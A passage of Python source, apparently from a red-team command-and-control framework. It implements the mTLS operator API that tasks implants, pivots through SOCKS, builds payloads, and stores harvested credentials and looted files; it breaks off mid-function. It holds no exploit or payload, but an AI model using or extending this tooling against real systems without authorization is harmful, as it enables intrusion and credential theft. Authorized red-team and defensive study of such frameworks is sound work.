"""Operator listener over mTLS.

The listener is the entire trust boundary between the team server
and remote operators. Every request passes through `_require`,
which enforces three things:

  1. The TLS handshake completed with a valid client certificate.
  2. The operator is in the registry and not revoked.
  3. The operator's role contains the required capability, AND the
     capability is not local-only (or the request originated from
     the local console).

If any check fails, the request is refused and the refusal is
audited.
"""

import hashlib
import json
import os as _os
import socket
import ssl
import threading
import time
from typing import Optional, Tuple

from flask import Flask, Response, jsonify, request

from . import constants
from .aliases import AliasStore
from .audit import AuditLog
from .chat import (
    ChatRoom, FileStore, _sanitize_chat_text,
    sanitize as sanitize_chat, SANITIZER_VERSION,
)
from .creds import CredStore
from .lootstore import LootStore
from .notes import NotesStore
from .operators import OperatorRegistry
from .webhooks import WebhookStore

try:
    from ..quiet_werkzeug import QuietWSGIRequestHandler
except ImportError:
    QuietWSGIRequestHandler = None


class MultiplayerState:
    """Shared boolean checked on every request.

    Held on the listener, not on the engine, so toggling multiplayer
    is a property of the operator interface, not of the beacon
    subsystem. A local console flips this by calling
    `set_enabled(True/False)`."""

    def __init__(self):
        self._lock = threading.Lock()
        self._enabled = False

    def is_enabled(self) -> bool:
        with self._lock:
            return self._enabled

    def set_enabled(self, value: bool) -> None:
        with self._lock:
            self._enabled = value


_rate_lock = threading.Lock()
_rate_state: dict = {}


def _rate_allowed(cn: str) -> bool:
    now = time.monotonic()
    with _rate_lock:
        state = _rate_state.setdefault(cn, {'tokens': constants.RATE_BURST,
                                             'last': now})
        elapsed = now - state['last']
        state['last'] = now
        state['tokens'] = min(
            constants.RATE_BURST,
            state['tokens'] + elapsed * constants.RATE_PER_SEC)
        if state['tokens'] < 1.0:
            return False
        state['tokens'] -= 1.0
        return True

_concurrent_lock = threading.Lock()
_concurrent_state: dict = {}   # cn -> in-flight request count

MAX_CONCURRENT_PER_OPERATOR = 6


def _concurrent_acquire(cn: str) -> bool:
    with _concurrent_lock:
        n = _concurrent_state.get(cn, 0)
        if n >= MAX_CONCURRENT_PER_OPERATOR:
            return False
        _concurrent_state[cn] = n + 1
        return True


def _concurrent_release(cn: str) -> None:
    with _concurrent_lock:
        n = _concurrent_state.get(cn, 1) - 1
        if n <= 0:
            _concurrent_state.pop(cn, None)
        else:
            _concurrent_state[cn] = n

_chat_rate_lock = threading.Lock()
_chat_rate_state: dict = {}

def _chat_rate_allowed(cn: str) -> bool:
    now = time.monotonic()
    with _chat_rate_lock:
        state = _chat_rate_state.setdefault(
            cn, {'tokens': constants.CHAT_BURST, 'last': now})
        elapsed = now - state['last']
        state['last'] = now
        state['tokens'] = min(
            constants.CHAT_BURST,
            state['tokens'] + elapsed * constants.CHAT_PER_SEC)
        if state['tokens'] < 1.0:
            return False
        state['tokens'] -= 1.0
        return True


# Per-source-IP bucket that runs *before* the client certificate
# is parsed. The per-operator bucket in `_rate_allowed` cannot
# protect the auth path itself, because an operator is not
# identified until `_extract_peer` has already run — and a request
# with a bad HMAC never reaches the per-operator check. A hostile
# actor holding one valid cert can otherwise flood the HMAC
# comparison at the cost of a werkzeug worker thread per request.
#
# The limits are intentionally generous: a legitimate client
# polls a long-poll endpoint a handful of times per second at
# most, so 100/sec sustained with a 300-request burst never
# fires on real traffic. A flood of thousands per second is
# refused at the first check, before the cert is touched.
_PREAUTH_PER_SEC = 100.0
_PREAUTH_BURST   = 300.0
_preauth_lock = threading.Lock()
_preauth_state: dict = {}


def _preauth_rate_allowed(ip: str) -> bool:
    if not ip:
        return True
    now = time.monotonic()
    with _preauth_lock:
        state = _preauth_state.setdefault(
            ip, {'tokens': _PREAUTH_BURST, 'last': now})
        elapsed = now - state['last']
        state['last'] = now
        state['tokens'] = min(
            _PREAUTH_BURST,
            state['tokens'] + elapsed * _PREAUTH_PER_SEC)
        if state['tokens'] < 1.0:
            return False
        state['tokens'] -= 1.0
        # Prune the map when it grows. Same shape as the other
        # buckets: drop anything idle for more than 10 minutes.
        if len(_preauth_state) > 4096:
            cutoff = now - 600.0
            for k in [k for k, s in _preauth_state.items()
                      if s['last'] < cutoff]:
                _preauth_state.pop(k, None)
        return True

_seen_lock = threading.Lock()
_seen_certs: dict = {}

SESSION_TTL_SECONDS = 12 * 3600

_nonce_lock = threading.Lock()
_nonce_cache: dict = {}    # (cn, nonce) -> expiry_monotonic

NONCE_CACHE_MAX = 65536


def _nonce_accept(cn: str, nonce: str, ts: float) -> bool:
    """Return True if this (cn, nonce) has not been seen inside the
    current HMAC window, and record it. Return False on replay.

    `ts` is the request timestamp, in the same units the HMAC
    verification used. The expiry is computed off the wall clock
    here, not off `ts`, so a client cannot extend its own window
    by replaying an old timestamp — the timestamp already passed
    the +/- 300 check before this runs.
    """
    now = time.monotonic()
    expiry = now + 300.0
    key = (cn, nonce)
    with _nonce_lock:
        if len(_nonce_cache) > 256:
            expired = [k for k, exp in _nonce_cache.items()
                       if exp <= now]
            for k in expired:
                _nonce_cache.pop(k, None)
        if key in _nonce_cache:
            return False
        if len(_nonce_cache) >= NONCE_CACHE_MAX:
            oldest = min(_nonce_cache, key=_nonce_cache.get)
            _nonce_cache.pop(oldest, None)
        _nonce_cache[key] = expiry
        return True

_CHAT_NOTICE_TEXTS = {
    'join':  'entered the room',
    'leave': 'left the room',
}

_presence_lock = threading.Lock()
_presence: dict = {}   # cn -> monotonic timestamp of last poll

PRESENCE_WINDOW = 15.0
PRESENCE_RETAIN = 300.0  # keep idle entries for /who for 5 min


def _presence_record(cn: str) -> None:
    now = time.monotonic()
    with _presence_lock:
        _presence[cn] = now
        cutoff = now - PRESENCE_RETAIN
        stale = [k for k, ts in _presence.items() if ts < cutoff]
        for k in stale:
            _presence.pop(k, None)


def _presence_snapshot() -> dict:
    """Return {cn: idle_seconds} for every operator seen recently."""
    now = time.monotonic()
    with _presence_lock:
        return {k: now - ts for k, ts in _presence.items()}

_viewer_lock = threading.Lock()
_viewers: dict = {}   # (int beacon_id, str cn) -> monotonic ts

BEACON_VIEWER_TTL = 30.0


def _viewer_record(beacon_id: int, cn: str) -> None:
    """Record (beacon_id, cn) as attached, and prune stale entries.

    An operator is attached to at most one beacon at a time.
    Recording a new attachment implicitly clears the previous one,
    so a `use` switch does not leave a stale entry on the old
    beacon. Without this, the roster for the previous beacon keeps
    showing the operator until the TTL expires.
    """
    now = time.monotonic()
    with _viewer_lock:
        for k in [k for k in _viewers
                  if k[1] == cn and k[0] != beacon_id]:
            _viewers.pop(k, None)
        _viewers[(beacon_id, cn)] = now
        cutoff = now - BEACON_VIEWER_TTL * 4
        stale = [k for k, ts in _viewers.items() if ts < cutoff]
        for k in stale:
            _viewers.pop(k, None)


def _viewer_clear(beacon_id: int, cn: str) -> None:
    with _viewer_lock:
        _viewers.pop((beacon_id, cn), None)


def _viewer_snapshot(beacon_id: int) -> list:
    """Return a list of {name, idle} for viewers of one beacon."""
    now = time.monotonic()
    with _viewer_lock:
        rows = []
        stale = []
        for (bid, cn), ts in _viewers.items():
            if bid != beacon_id:
                continue
            age = now - ts
            if age > BEACON_VIEWER_TTL:
                stale.append((bid, cn))
                continue
            rows.append({'name': cn, 'idle': round(age, 1)})
        for key in stale:
            _viewers.pop(key, None)
    rows.sort(key=lambda r: r['name'])
    return rows


class OperatorListener:

    def __init__(self, engine, host: str, port: int,
                 registry: OperatorRegistry,
                 audit: AuditLog,
                 multiplayer_state: MultiplayerState):
        self.engine = engine
        self.host = host
        self.port = port
        self.registry = registry
        self.audit = audit
        self.multiplayer = multiplayer_state

        try:
            from .build_manager import BuildManager
            handler = getattr(engine, 'handler', None)
            if handler is not None:
                self.build_manager = BuildManager(handler)
            else:
                self.build_manager = None
        except Exception:
            self.build_manager = None

        self.chat = ChatRoom(
            persist_dir=constants.CHAT_LOG_DIR)

        try:
            self.loot = LootStore(constants.LOOT_DIR)
        except Exception:
            self.loot = None

        _logs_dir = _os.path.join(
            _os.path.dirname(_os.path.abspath(__file__)),
            '..', '..', 'logs')
        try:
            self.aliases = AliasStore(
                _os.path.join(_logs_dir, 'aliases.json'))
        except Exception:
            self.aliases = None
        try:
            self.creds = CredStore(
                _os.path.join(_logs_dir, 'creds.json'))
        except Exception:
            self.creds = None
        try:
            self.notes = NotesStore(_logs_dir)
        except Exception:
            self.notes = None
        try:
            self.webhooks = WebhookStore(
                _os.path.join(_logs_dir, 'webhooks.json'))
        except Exception:
            self.webhooks = None

        try:
            if self.webhooks is not None:
                self.engine.attach_webhooks(self.webhooks)
        except Exception:
            pass

        self._app = self._build_app()
        self._thread: Optional[threading.Thread] = None
        self._running = False
        self.ca_fingerprint_loaded: Optional[str] = None

    def _deadman(self):
        """Return the running DeadmanSwitch, or None if it has
        not been constructed yet."""
        handler = getattr(self.engine, 'handler', None)
        if handler is None:
            return None
        return getattr(handler, 'deadman', None)

    # ------------------------------------------------------------------
    # Flask app

    def _build_app(self) -> Flask:
        app = Flask(__name__)
        app.config['MAX_CONTENT_LENGTH'] = constants.MAX_REQUEST_BYTES

        @app.before_request
        def _gate():
            if not self.multiplayer.is_enabled():
                return Response(status=503)

        @app.route('/api/v1/beacon/kill', methods=['POST'])
        def beacon_kill():
            return self._with_cap('beacon.use', self._beacon_kill)

        @app.route('/api/v1/webhooks', methods=['POST'])
        def webhooks_list():
            return self._with_cap('webhooks.manage', self._webhooks_list)

        @app.route('/api/v1/webhooks/add', methods=['POST'])
        def webhooks_add():
            return self._with_cap('webhooks.manage', self._webhooks_add)

        @app.route('/api/v1/webhooks/remove', methods=['POST'])
        def webhooks_remove():
            return self._with_cap('webhooks.manage', self._webhooks_remove)

        @app.route('/api/v1/webhooks/test', methods=['POST'])
        def webhooks_test():
            return self._with_cap('webhooks.manage', self._webhooks_test)

        @app.route('/api/v1/beacon/<int:bid>/note', methods=['POST'])
        def beacon_note(bid):
            return self._with_cap(
                'beacon.use',
                lambda n, r, ip: self._beacon_note(n, r, ip, bid))

        @app.route('/api/v1/notes', methods=['POST'])
        def notes_global():
            return self._with_cap('notes.use', self._notes_global)

        @app.route('/api/v1/creds/add', methods=['POST'])
        def creds_add():
            return self._with_cap('creds.use', self._creds_add)

        @app.route('/api/v1/creds/list', methods=['POST'])
        def creds_list():
            return self._with_cap('creds.use', self._creds_list)

        @app.route('/api/v1/creds/get', methods=['POST'])
        def creds_get():
            return self._with_cap('creds.use', self._creds_get)

        @app.route('/api/v1/creds/search', methods=['POST'])
        def creds_search():
            return self._with_cap('creds.use', self._creds_search)

        @app.route('/api/v1/creds/delete', methods=['POST'])
        def creds_delete():
            return self._with_cap('creds.use', self._creds_delete)

        @app.route('/api/v1/creds/validate', methods=['POST'])
        def creds_validate():
            return self._with_cap('creds.use', self._creds_validate)

        @app.route('/api/v1/beacon/<int:bid>/alias', methods=['POST'])
        def beacon_alias(bid):
            return self._with_cap(
                'beacon.use',
                lambda n, r, ip: self._beacon_alias(n, r, ip, bid))

        @app.route('/api/v1/beacon/<int:bid>/tag', methods=['POST'])
        def beacon_tag(bid):
            return self._with_cap(
                'beacon.use',
                lambda n, r, ip: self._beacon_tag(n, r, ip, bid))

        @app.route('/api/v1/identify', methods=['POST'])
        def identify():
            return self._identify()

        @app.route('/api/v1/beacons', methods=['POST'])
        def beacons_list():
            return self._with_cap('beacon.list', self._beacons_list)

        @app.route('/api/v1/beacon/<int:bid>/task', methods=['POST'])
        def beacon_task(bid):
            return self._with_cap(
                'beacon.use', lambda n, r, ip: self._beacon_task(
                    n, r, ip, bid))

        @app.route('/api/v1/beacon/<int:bid>/result/<tid>',
                   methods=['POST'])
        def beacon_result(bid, tid):
            return self._with_cap(
                'beacon.use',
                lambda n, r, ip: self._beacon_result(
                    n, r, ip, bid, tid),
                skip_rate_limit=True)

        @app.route('/api/v1/audit', methods=['POST'])
        def audit_read():
            return self._audit_read()

        @app.route('/api/v1/commands', methods=['POST'])
        def commands_list():
            return self._with_cap(
                'commands.list', self._commands_list)

        @app.route('/api/v1/bofs', methods=['POST'])
        def bofs_list():
            return self._with_cap('beacon.build', self._bofs_list)

        @app.route('/api/v1/bofs/get', methods=['POST'])
        def bofs_get():
            return self._with_cap('beacon.build', self._bofs_get)

        @app.route('/api/v1/bofs/add', methods=['POST'])
        def bofs_add():
            return self._with_cap('beacon.build', self._bofs_add)

        @app.route('/api/v1/bofs/remove', methods=['POST'])
        def bofs_remove():
            return self._with_cap('beacon.build', self._bofs_remove)

        @app.route('/api/v1/beacon/build', methods=['POST'])
        def beacon_build():
            return self._with_cap(
                'beacon.build', self._beacon_build)

        @app.route('/api/v1/beacon/build/<build_id>/chunk',
                   methods=['POST'])
        def beacon_build_chunk(build_id):
            return self._with_cap(
                'beacon.build',
                lambda n, r, ip: self._beacon_build_chunk(
                    n, r, ip, build_id))

        @app.route('/api/v1/beacon/build/<build_id>/finish',
                   methods=['POST'])
        def beacon_build_finish(build_id):
            return self._with_cap(
                'beacon.build',
                lambda n, r, ip: self._beacon_build_finish(
                    n, r, ip, build_id))

        @app.route('/api/v1/beacon/<int:bid>/dump',
                   methods=['POST'])
        def beacon_dump(bid):
            return self._with_cap(
                'beacon.export',
                lambda n, r, ip: self._beacon_dump(n, r, ip, bid))

        @app.route('/api/v1/graph', methods=['POST'])
        def graph_view():
            return self._with_cap(
                'beacon.list', self._graph_view)

        @app.route('/api/v1/beacon/<int:bid>/forget',
                   methods=['POST'])
        def beacon_forget(bid):
            return self._with_cap(
                'beacon.use',
                lambda n, r, ip: self._beacon_forget(n, r, ip, bid))

        @app.route('/api/v1/beacon/<int:bid>/tasks',
                   methods=['POST'])
        def beacon_tasks(bid):
            return self._with_cap(
                'beacon.use',
                lambda n, r, ip: self._beacon_tasks(n, r, ip, bid),
                skip_rate_limit=True)

        @app.route('/api/v1/beacon/<int:bid>/cancel/<tid>',
                   methods=['POST'])
        def beacon_cancel(bid, tid):
            return self._with_cap(
                'beacon.use',
                lambda n, r, ip: self._beacon_cancel(
                    n, r, ip, bid, tid))

        @app.route('/api/v1/beacon/<int:bid>/schedule',
                   methods=['POST'])
        def beacon_schedule(bid):
            return self._with_cap(
                'beacon.use',
                lambda n, r, ip: self._beacon_schedule(n, r, ip, bid))

        @app.route('/api/v1/beacon/<int:bid>/socks/start',
                   methods=['POST'])
        def socks_start(bid):
            return self._with_cap(
                'beacon.socks',
                lambda n, r, ip: self._socks_start(n, r, ip, bid))

        @app.route('/api/v1/beacon/<int:bid>/socks/stop',
                   methods=['POST'])
        def socks_stop(bid):
            return self._with_cap(
                'beacon.socks',
                lambda n, r, ip: self._socks_stop(n, r, ip, bid))

        @app.route('/api/v1/beacon/<int:bid>/socks/status',
                   methods=['POST'])
        def socks_status(bid):
            return self._with_cap(
                'beacon.socks',
                lambda n, r, ip: self._socks_status(n, r, ip, bid))

        @app.route('/api/v1/deadman/status', methods=['POST'])
        def deadman_status():
            return self._with_cap(
                'deadman.view', self._deadman_status)

        @app.route('/api/v1/deadman/arm', methods=['POST'])
        def deadman_arm():
            return self._with_cap(
                'deadman.arm', self._deadman_arm)

        @app.route('/api/v1/deadman/arm-until', methods=['POST'])
        def deadman_arm_until():
            return self._with_cap(
                'deadman.arm', self._deadman_arm_until)

        @app.route('/api/v1/deadman/reset', methods=['POST'])
        def deadman_reset():
            return self._with_cap(
                'deadman.arm', self._deadman_reset)

        @app.route('/api/v1/deadman/disable', methods=['POST'])
        def deadman_disable():
            return self._with_cap(
                'deadman.arm', self._deadman_disable)

        @app.route('/api/v1/deadman/warn', methods=['POST'])
        def deadman_warn():
            return self._with_cap(
                'deadman.arm', self._deadman_warn)

        @app.route('/api/v1/deadman/halt-mode', methods=['POST'])
        def deadman_halt_mode():
            return self._with_cap(
                'deadman.arm', self._deadman_halt_mode)

        @app.route('/api/v1/deadman/shred-mode', methods=['POST'])
        def deadman_shred_mode():
            return self._with_cap(
                'deadman.arm', self._deadman_shred_mode)

        @app.route('/api/v1/deadman/halt', methods=['POST'])
        def deadman_halt():
            return self._with_cap(
                'deadman.halt', self._deadman_halt)

        @app.route('/api/v1/chat/send', methods=['POST'])
        def chat_send():
            return self._with_cap('chat.use', self._chat_send)

        @app.route('/api/v1/chat/poll', methods=['POST'])
        def chat_poll():
            return self._with_cap(
                'chat.use', self._chat_poll, skip_rate_limit=True)

        @app.route('/api/v1/chat/history', methods=['POST'])
        def chat_history():
            return self._with_cap('chat.use', self._chat_history)

        @app.route('/api/v1/chat/who', methods=['POST'])
        def chat_who():
            return self._with_cap('chat.use', self._chat_who)

        @app.route('/api/v1/chat/topic', methods=['GET', 'POST'])
        def chat_topic():
            return self._with_cap('chat.use', self._chat_topic)

        @app.route('/api/v1/chat/file/upload', methods=['POST'])
        def chat_file_upload():
            return self._with_cap('chat.use',
                                  self._chat_file_upload)

        @app.route('/api/v1/chat/file/download', methods=['POST'])
        def chat_file_download():
            return self._with_cap('chat.use',
                                  self._chat_file_download)

        @app.route('/api/v1/chat/file/delete', methods=['POST'])
        def chat_file_delete():
            return self._with_cap('chat.use',
                                  self._chat_file_delete)

        @app.route('/api/v1/chat/files', methods=['POST'])
        def chat_files_list():
            return self._with_cap('chat.use',
                                  self._chat_file_list)

        @app.route('/api/v1/loot/list', methods=['POST'])
        def loot_list():
            return self._with_cap('loot.use', self._loot_list)

        @app.route('/api/v1/loot/upload', methods=['POST'])
        def loot_upload():
            return self._with_cap('loot.use', self._loot_upload)

        @app.route('/api/v1/loot/download', methods=['POST'])
        def loot_download():
            return self._with_cap('loot.use', self._loot_download)

        @app.route('/api/v1/loot/delete', methods=['POST'])
        def loot_delete():
            return self._with_cap('loot.use', self._loot_delete)

        @app.route('/api/v1/loot/upload/init', methods=['POST'])
        def loot_upload_init():
            return self._with_cap('loot.use',
                                  self._loot_upload_init)

        @app.route('/api/v1/loot/upload/chunk', methods=['POST'])
        def loot_upload_chunk():
            return self._with_cap('loot.use',
                                  self._loot_upload_chunk)

        @app.route('/api/v1/loot/upload/finish', methods=['POST'])
        def loot_upload_finish():
            return self._with_cap('loot.use',
                                  self._loot_upload_finish)

        @app.route('/api/v1/loot/upload/abort', methods=['POST'])
        def loot_upload_abort():
            return self._with_cap('loot.use',
                                  self._loot_upload_abort)

        @app.route('/api/v1/operators', methods=['POST'])
        def operators_list():
            return self._with_cap(
                'operator.list', self._operators_list)

        @app.route('/api/v1/operators/add', methods=['POST'])
        def operators_add():
            return self._with_cap(
                'operator.add', self._operators_add)

        @app.route('/api/v1/operators/remove', methods=['POST'])
        def operators_remove():
            return self._with_cap(
                'operator.remove', self._operators_remove)

        @app.route('/api/v1/operators/set-role', methods=['POST'])
        def operators_set_role():
            return self._with_cap(
                'operator.set_role', self._operators_set_role)

        @app.route('/api/v1/operators/export', methods=['POST'])
        def operators_export():
            return self._with_cap(
                'operator.export.self',
                self._operators_export,
                skip_rate_limit=False)

        @app.route('/api/v1/operators/passwd', methods=['POST'])
        def operators_passwd():
            return self._with_cap(
                'operator.passwd.self',
                self._operators_passwd)

        @app.route('/api/v1/c2-profiles', methods=['POST'])
        def c2_profiles():
            return self._with_cap(
                'beacon.build', self._c2_profiles)

        return app


    def _beacon_kill(self, name, role, ip):
        """Bulk self-destruct.

        Scope is one of:

          * {'scope': 'all'}                — every live session
          * {'scope': 'tag', 'tag': 'X'}    — every session tagged X
          * {'scope': 'ids', 'ids': [...]}  — an explicit list
          * {'scope': 'stale'}              — sessions whose last
                                              check-in is older
                                              than their TTL

        The server iterates and enqueues one `kill` task per match.
        Per-beacon audit entries are written so the chain names
        every target, plus one summary entry so a reader can see
        the group operation as a unit.

        Refuses an empty match set rather than returning success
        with zero kills — "I asked for kill --all and got back ok"
        while nothing happened is the failure mode operators do
        not recover from until much later.
        """
        payload = request.get_json(force=True, silent=True) or {}
        scope = (payload.get('scope') or '').strip().lower()

        matches = []
        if scope == 'all':
            matches = list(self.engine.list_all())
        elif scope == 'stale':
            matches = [s for s in self.engine.list_all()
                       if not s.alive]
        elif scope == 'tag':
            tag = (payload.get('tag') or '').strip()
            if not tag:
                return self._err_400(name, role, ip,
                                     'beacon.kill',
                                     'scope=tag requires tag')
            aliases = (self.aliases.all()
                       if self.aliases is not None else {})
            for s in self.engine.list_all():
                a = aliases.get(str(s.id), {}) or {}
                if tag in (a.get('tags') or []):
                    matches.append(s)
        elif scope == 'ids':
            ids = payload.get('ids') or []
            if not isinstance(ids, list):
                return self._err_400(name, role, ip,
                                     'beacon.kill',
                                     'ids must be a list')
            for raw in ids:
                try:
                    sid = int(raw)
                except (TypeError, ValueError):
                    continue
                s = self.engine.get(sid)
                if s is not None:
                    matches.append(s)
        else:
            return self._err_400(
                name, role, ip, 'beacon.kill',
                f'unknown scope {scope!r}; use all, stale, '
                f'tag, or ids')

        if not matches:
            return self._err_400(
                name, role, ip, 'beacon.kill',
                'no beacons matched the requested scope')

        killed = []
        failed = []
        for s in matches:
            tid = self.engine.enqueue(
                s.id, 'kill', [], timeout=30, queued_by=name)
            if tid:
                killed.append({'id': s.id, 'task': tid})
                self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='beacon.use', target=f'#{s.id}',
                    detail='kill (bulk)')
            else:
                failed.append(s.id)

        self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='beacon.kill',
            detail=(f'scope={scope} '
                    f'matched={len(matches)} '
                    f'killed={len(killed)} '
                    f'failed={len(failed)}'))

        return jsonify({
            'ok':      True,
            'scope':   scope,
            'matched': len(matches),
            'killed':  len(killed),
            'failed':  failed,
            'results': killed,
        })

    def _beacon_alias(self, name, role, ip, bid):
        if self.engine.get(bid) is None:
            return Response(status=404)
        payload = request.get_json(force=True, silent=True) or {}
        alias = (payload.get('alias') or '').strip()
        try:
            self.aliases.set_alias(bid, alias, by=name)
        except ValueError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='beacon.alias', target=f'#{bid}',
                outcome='error', detail=str(exc)[:200])
            resp = jsonify({'error': str(exc), 'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='beacon.alias', target=f'#{bid}',
            detail=f'alias={alias!r}')
        return jsonify({'ok': True, 'alias': alias,
                        'audit_id': audit_id})

    def _beacon_tag(self, name, role, ip, bid):
        if self.engine.get(bid) is None:
            return Response(status=404)
        payload = request.get_json(force=True, silent=True) or {}
        op = (payload.get('op') or 'add').lower()
        tag = (payload.get('tag') or '').strip()
        try:
            if op == 'add':
                tags = self.aliases.add_tag(bid, tag, by=name)
            elif op == 'remove':
                tags = self.aliases.remove_tag(bid, tag, by=name)
            else:
                return Response(status=400)
        except ValueError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='beacon.tag', target=f'#{bid}',
                outcome='error', detail=str(exc)[:200])
            resp = jsonify({'error': str(exc), 'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='beacon.tag', target=f'#{bid}',
            detail=f'{op} tag={tag!r}')
        return jsonify({'ok': True, 'tags': tags, 'audit_id': audit_id})


    def _creds_add(self, name, role, ip):
        payload = request.get_json(force=True, silent=True) or {}
        user = (payload.get('user') or '').strip()
        domain = (payload.get('domain') or '').strip().upper()
        kind = (payload.get('kind') or 'plaintext').strip().lower()
        value = payload.get('value') or ''
        source_beacon = int(payload.get('source_beacon') or 0)
        source_path = (payload.get('source_path') or '')[:1024]
        if not user:
            return self._err_400(name, role, ip, 'creds.add',
                                'missing user')
        if kind not in CredStore.KINDS:
            return self._err_400(
                name, role, ip, 'creds.add',
                f'invalid kind {kind!r}; valid kinds: '
                + ', '.join(CredStore.KINDS))
        entry = self.creds.add(
            user=user, domain=domain, kind=kind, value=value,
            source_beacon=source_beacon, source_path=source_path,
            found_by=name)
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='creds.add', target=entry['id'][:8],
            detail=(f'user={user} domain={domain} kind={kind} '
                    f'source=#{source_beacon}'))
        return jsonify({'ok': True, 'id': entry['id'],
                        'audit_id': audit_id})

    def _creds_list(self, name, role, ip):
        if self.creds is None:
            return Response(status=503)
        rows = self.creds.list()
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='creds.list', detail=f'{len(rows)} entries')
        return jsonify({'creds': rows, 'audit_id': audit_id})

    def _creds_get(self, name, role, ip):
        if self.creds is None:
            return Response(status=503)
        payload = request.get_json(force=True, silent=True) or {}
        cid = (payload.get('id') or '').strip()
        if not cid:
            return self._err_400(name, role, ip, 'creds.get',
                                'missing id')
        entry = self.creds.get(cid)
        if entry is None:
            return self._err_400(name, role, ip, 'creds.get',
                                f'credential {cid} not found')
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='creds.get', target=cid[:8],
            detail=f'user={entry.get("user","")} '
                   f'kind={entry.get("kind","")}')
        return jsonify({'ok': True, 'cred': entry,
                        'audit_id': audit_id})

    def _creds_search(self, name, role, ip):
        if self.creds is None:
            return Response(status=503)
        payload = request.get_json(force=True, silent=True) or {}
        term = (payload.get('term') or '').strip()
        rows = self.creds.search(term)
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='creds.search',
            detail=f'term={term!r} matches={len(rows)}')
        return jsonify({'creds': rows, 'audit_id': audit_id})

    def _creds_delete(self, name, role, ip):
        if self.creds is None:
            return Response(status=503)
        payload = request.get_json(force=True, silent=True) or {}
        cid = (payload.get('id') or '').strip()
        if not cid:
            return self._err_400(name, role, ip, 'creds.delete',
                                'missing id')
        entry = self.creds.delete(cid)
        if entry is None:
            return self._err_400(name, role, ip, 'creds.delete',
                                f'credential {cid} not found')
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='creds.delete', target=cid[:8],
            detail=f'user={entry.get("user","")} '
                   f'kind={entry.get("kind","")}')
        return jsonify({'ok': True, 'audit_id': audit_id})

    def _creds_validate(self, name, role, ip):
        """Record a validation result from a beacon.

        The client runs this after a ``cred_validate`` task
        returns. The body carries the credential id, the status
        the check produced, a short human-readable detail, and
        the beacon that ran the check.

        Refuses an unknown credential id with 404 rather than
        silently succeeding — a validation result against a
        credential that is not in the vault is either a client
        bug or a hand-crafted request, and both should be
        visible.
        """
        if self.creds is None:
            return Response(status=503)

        payload = request.get_json(force=True, silent=True) or {}
        cid = (payload.get('id') or '').strip()
        status = (payload.get('status') or '').strip().lower()
        detail = (payload.get('detail') or '')[:512]
        try:
            from_beacon = int(payload.get('from_beacon') or 0)
        except (TypeError, ValueError):
            from_beacon = 0

        if not cid:
            return self._err_400(name, role, ip,
                                 'creds.validate', 'missing id')

        try:
            entry = self.creds.validate(
                cid, status=status, detail=detail,
                by=name, from_beacon=from_beacon)
        except ValueError as exc:
            return self._err_400(name, role, ip,
                                 'creds.validate', str(exc))

        if entry is None:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='creds.validate', target=cid[:8],
                outcome='error', detail='not found')
            resp = jsonify({'error': f'credential {cid} not found',
                            'audit_id': audit_id})
            resp.status_code = 404
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='creds.validate', target=cid[:8],
            outcome='ok',
            detail=(f'status={status} from=#{from_beacon} '
                    f'user={entry.get("user","")} '
                    f'kind={entry.get("kind","")}'))
        return jsonify({'ok': True, 'cred': entry,
                        'audit_id': audit_id})

    def _beacon_note(self, name, role, ip, bid):
        if self.engine.get(bid) is None:
            return Response(status=404)
        if self.notes is None:
            return Response(status=503)
        payload = request.get_json(force=True, silent=True) or {}
        op = (payload.get('op') or 'list').lower()
        if op == 'list':
            return jsonify({'notes': self.notes.list_beacon(bid)})
        if op == 'add':
            text = (payload.get('text') or '').strip()
            if not text:
                return self._err_400(name, role, ip,
                                    'beacon.note.add',
                                    'missing text')
            self.notes.add_beacon(bid, name, text[:4096])
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='beacon.note.add', target=f'#{bid}',
                detail=text[:200])
            return jsonify({'ok': True, 'audit_id': audit_id})
        if op == 'clear':
            n = self.notes.clear_beacon(bid)
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='beacon.note.clear', target=f'#{bid}',
                detail=f'{n} notes')
            return jsonify({'ok': True, 'cleared': n,
                            'audit_id': audit_id})
        return Response(status=400)

    def _notes_global(self, name, role, ip):
        if self.notes is None:
            return Response(status=503)
        payload = request.get_json(force=True, silent=True) or {}
        op = (payload.get('op') or 'list').lower()
        if op == 'list':
            return jsonify({'notes': self.notes.list_global()})
        if op == 'search':
            term = (payload.get('term') or '').strip()
            return jsonify({
                'notes': self.notes.search_global(term)})
        if op == 'add':
            text = (payload.get('text') or '').strip()
            if not text:
                return self._err_400(name, role, ip,
                                    'notes.add', 'missing text')
            tags = [t.strip() for t in
                    (payload.get('tags') or []) if t.strip()]
            e = self.notes.add_global(name, text[:4096], tags)
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='notes.add', detail=text[:200])
            return jsonify({'ok': True, 'note': e,
                            'audit_id': audit_id})
        return Response(status=400)

    def _webhooks_list(self, name, role, ip):
        if self.webhooks is None:
            return Response(status=503)
        is_admin = constants.has_capability(
            role, 'webhooks.manage.admin', is_local=False)
        rows = self.webhooks.list(
            requester=name, is_admin=is_admin)
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='webhooks.list',
            detail=(f'{len(rows)} hooks '
                    f'({"all" if is_admin else "own"})'))
        return jsonify({'webhooks': rows, 'audit_id': audit_id})

    def _webhooks_add(self, name, role, ip):
        if self.webhooks is None:
            return Response(status=503)
        payload = request.get_json(force=True, silent=True) or {}
        try:
            entry = self.webhooks.add(
                name=(payload.get('name') or '').strip(),
